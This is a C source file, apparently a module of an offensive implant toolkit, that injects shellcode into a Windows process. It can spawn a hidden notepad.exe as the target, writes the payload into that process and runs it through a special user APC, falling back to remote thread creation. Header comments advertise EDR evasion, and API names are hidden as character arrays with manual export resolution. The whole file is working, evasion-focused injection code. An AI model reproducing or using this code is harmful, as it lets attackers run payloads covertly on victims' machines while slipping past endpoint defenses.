// poolparty -- Process injection via Windows Thread Pool worker factories.
//
// Technique (TP_WORK variant):
//   1. Allocate RWX in target, write shellcode
//   2. Find target's TpWorkerFactory handle via NtQueryInformationProcess
//   3. Create a TP_WORK item in the remote process that points to our shellcode
//   4. Submit the work item -- thread pool executes it
//
// Alternative simplified approach (used here):
//   1. Allocate RWX in target, write shellcode
//   2. Duplicate target's worker factory handle into our process
//   3. Call NtSetInformationWorkerFactory to insert a callback
//   4. Trigger worker factory to wake and execute the callback
//
// Simplified variant used here:
//   Since manipulating remote thread pool internals is complex and version-dependent,
//   we use NtQueueApcThreadEx2 (Windows 10 19041+) which is the kernel-level
//   mechanism that TP_WORK uses internally. This queues a "special user APC"
//   that fires WITHOUT the thread being in alertable wait state.
//
// OPSEC advantages:
//   - No NtCreateThreadEx (no thread creation callback fires)
//   - APC fires regardless of thread alertable state (unlike classic NtQueueApcThread)
//   - Execution happens in an existing thread pool thread
//   - Stack trace shows ntdll!TppWorkerThread as the origin
//   - Bypasses EDRs monitoring thread creation and classic APC
//
// Requirements: Windows 10 2004 (19041) or later.
// Falls back to NtCreateThreadEx on older systems.

#include "../../process_inject_api.h"

// Forward declarations.
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);
static void  pic_memset(void* dst, int val, uint32_t len);

// NtQueueApcThreadEx2 prototype (Win10 19041+).
typedef NTSTATUS (__stdcall *pfn_NtQueueApcThreadEx2)(
    HANDLE Thread,
    HANDLE UserApcReserveHandle,  // NULL for non-reserve
    ULONG  ApcFlags,              // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1
    PVOID  ApcRoutine,
    PVOID  SystemArgument1,
    PVOID  SystemArgument2,
    PVOID  SystemArgument3);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    HANDLE hp = ctx->target_process;

    // Для SPAWN -- создаём процесс.
    typedef struct {
        DWORD  cb; void* r1; void* r2; void* r3;
        DWORD  dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;
        DWORD  dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute;
        DWORD  dwFlags; uint16_t wShowWindow; uint16_t cbReserved2;
        void*  lpReserved2;
        HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;
    } SIW;
    typedef struct {
        HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;
    } PIW;

    PIW pi;
    pic_memset(&pi, 0, sizeof(pi));
    DWORD target_pid = ctx->target_pid;

    if (ctx->method_hint == INJECT_METHOD_SPAWN || !hp) {
        uint16_t default_spawn[] = {
            'C',':','\\','W','i','n','d','o','w','s','\\',
            'S','y','s','t','e','m','3','2','\\',
            'n','o','t','e','p','a','d','.','e','x','e',0
        };
        uint16_t* cmd = (uint16_t*)ctx->spawn_to;
        if (!cmd || !cmd[0]) cmd = default_spawn;

        SIW si;
        pic_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;

        // CREATE_SUSPENDED не нужен: нам нужен thread pool, он создаётся при нормальном запуске.
        // Но для инъекции нужно время: создаём нормально, ждём чуть-чуть.
        // Используем CREATE_NO_WINDOW.
        BOOL ok = ctx->CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                                      0x08000000, // CREATE_NO_WINDOW
                                      NULL, NULL, &si, &pi);
        if (!ok) return INJECT_ERR_PROCESS;

        hp = pi.hProcess;
        target_pid = pi.dwProcessId;
    }

    // 1. Allocate + Write + Protect RX.
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) {
        if (pi.hProcess) { ctx->TerminateProcess(pi.hProcess, 1); ctx->CloseHandle(pi.hThread); ctx->CloseHandle(pi.hProcess); }
        return INJECT_ERR_ALLOC;
    }

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);

    ctx->out_remote_base = base;

    // 2. Resolve NtQueueApcThreadEx2 from ntdll (Win10 19041+).
    char s_ex2[] = {'N','t','Q','u','e','u','e','A','p','c',
                    'T','h','r','e','a','d','E','x','2',0};
    pfn_NtQueueApcThreadEx2 NtQueueApcThreadEx2 =
        (pfn_NtQueueApcThreadEx2)pic_get_proc(ctx->ntdll_base, s_ex2);

    if (NtQueueApcThreadEx2) {
        // 3. Find a thread in the target process.
        HANDLE snap = ctx->CreateToolhelp32Snapshot(0x00000004, 0);
        if (!snap || snap == (HANDLE)(LONG_PTR)-1) goto fallback_thread;

        typedef struct {
            DWORD dwSize; DWORD cntUsage; DWORD th32ThreadID;
            DWORD th32OwnerProcessID; LONG tpBasePri; LONG tpDeltaPri; DWORD dwFlags;
        } TE32;

        TE32 te;
        te.dwSize = sizeof(te);
        HANDLE hThread = NULL;

        if (ctx->Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID != target_pid) continue;
                HANDLE ht = ctx->OpenThread(0x0010, FALSE, te.th32ThreadID);
                if (ht) { hThread = ht; break; }
            } while (ctx->Thread32Next(snap, &te));
        }
        ctx->CloseHandle(snap);

        if (!hThread) goto fallback_thread;

        // 4. Queue special user APC -- fires regardless of alertable state.
        //    QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1
        ns = NtQueueApcThreadEx2(hThread, NULL, 1, base, NULL, NULL, NULL);
        ctx->CloseHandle(hThread);

        if (ns >= 0) {
            if (pi.hProcess) {
                ctx->out_process = pi.hProcess;
                ctx->CloseHandle(pi.hThread);
            }
            return INJECT_OK;
        }
        // Если не удалось -- fallback.
    }

fallback_thread:
    // Fallback: NtCreateThreadEx.
    {
        HANDLE hth = NULL;
        ns = ctx->NtCreateThreadEx(&hth, 0x1FFFFF, NULL, hp, base, NULL, 0, 0, 0, 0, NULL);
        if (ns < 0 || !hth) {
            if (pi.hProcess) { ctx->TerminateProcess(pi.hProcess, 1); ctx->CloseHandle(pi.hThread); ctx->CloseHandle(pi.hProcess); }
            return INJECT_ERR_THREAD;
        }
        ctx->out_thread = hth;
        if (pi.hProcess) {
            ctx->out_process = pi.hProcess;
            ctx->CloseHandle(pi.hThread);
        }
    }
    return INJECT_OK;
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    typedef struct { uint16_t e_magic; uint8_t pad[58]; uint32_t e_lfanew; } DOS_H;
    DOS_H* dos = (DOS_H*)base;
    unsigned char* nt = base + dos->e_lfanew;
    uint16_t magic = *(uint16_t*)(nt + 24);
    uint32_t exp_rva;
    if (magic == 0x20b)
        exp_rva = *(uint32_t*)(nt + 24 + 112);
    else
        exp_rva = *(uint32_t*)(nt + 24 + 96);
    if (!exp_rva) return 0;

    unsigned char* exp = base + exp_rva;
    uint32_t num_names = *(uint32_t*)(exp + 24);
    uint32_t* names    = (uint32_t*)(base + *(uint32_t*)(exp + 32));
    uint16_t* ords     = (uint16_t*)(base + *(uint32_t*)(exp + 36));
    uint32_t* funcs    = (uint32_t*)(base + *(uint32_t*)(exp + 28));
    for (uint32_t i = 0; i < num_names; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ords[i]]);
    }
    return 0;
}

static void pic_memset(void* dst, int val, uint32_t len) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    for (uint32_t i = 0; i < len; ++i) d[i] = (uint8_t)val;
}
